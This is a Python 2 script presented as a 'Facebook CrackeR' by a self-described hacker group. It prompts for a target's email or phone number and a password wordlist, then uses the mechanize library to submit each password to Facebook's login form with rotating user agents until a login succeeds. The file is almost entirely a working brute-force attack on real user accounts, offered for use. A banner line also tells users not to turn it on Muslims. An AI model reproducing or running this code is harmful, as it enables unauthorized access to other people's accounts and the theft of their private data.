#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import mechanize
import cookielib
import random
import os
##############
W = '\033[1;34;40m'
Br = '\033[1;32;40m'
Bg = '\033[1;31;40m'
Y = '\033[1;32;40m'
Bb = '\033[1;32;40m'
Bm = '\033[1;32;40m'
Bc = '\033[1;32;40m'
M = '\033[1;34m'
C = '\033[1;31m'
D = '\033[1;32m'
##################
os.system("clear")
print(C)
print("                   |=============================|")
print(D)
print("                         |=================|")
print(W)
print("                             |=========|")
print(M)
print("                               |=====|")
print(Br)
print("                                |===|")
print("\r")
print(C)
print("                        By ==>  Ali Elhafeth")

print(D)

print("                     & & & & & & & & & & & & & & & &")

print(W)

print(" -----[C] 2018------|| BlackHaT Sudan || - Member Of SeCretSDN||")
print
print
print
print
print("[*] This Script Hacked Facebook,Enter Email,And Enter Full path")
print("[*] We Using Brute Forse")
print("[*] Dont Use it To Muslims")
print(C)
print("————————————————————————")

email = str(raw_input("Enter Username (or) Email (or) Phone Number : "))


passwordlist = str(raw_input("Enter Full path : "))


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("Password does not exist in the wordlist")



def brute(password):
	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n[+] Password matched = {}".format(password))
			raw_input("ANY KEY to Exit....")
			sys.exit(1)


def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)
os.system("clear")
os.system("toilet -f mono12 -F border HwakSDN")

#welcome 
def welcome():
	wel = """

                     +----------------------------------------------+
                     [*]=>Hwak-Sdn Facebook CrackeR
        	     [*]====> By Ali-Alhafeth <=== *_*
 	      	     [*]github=>https://github.com/SeCretSDN
                     +-----------------------------------------------+
"""
	total = open(passwordlist,"r")
	total = total.readlines()
	print wel 
	print " [*] Account to crack : {}".format(email)
	print " [*] Loaded :" , len(total), "passwords"
	print " [*] Cracking, please wait ...\n\n"


if __name__ == '__main__':
	main()

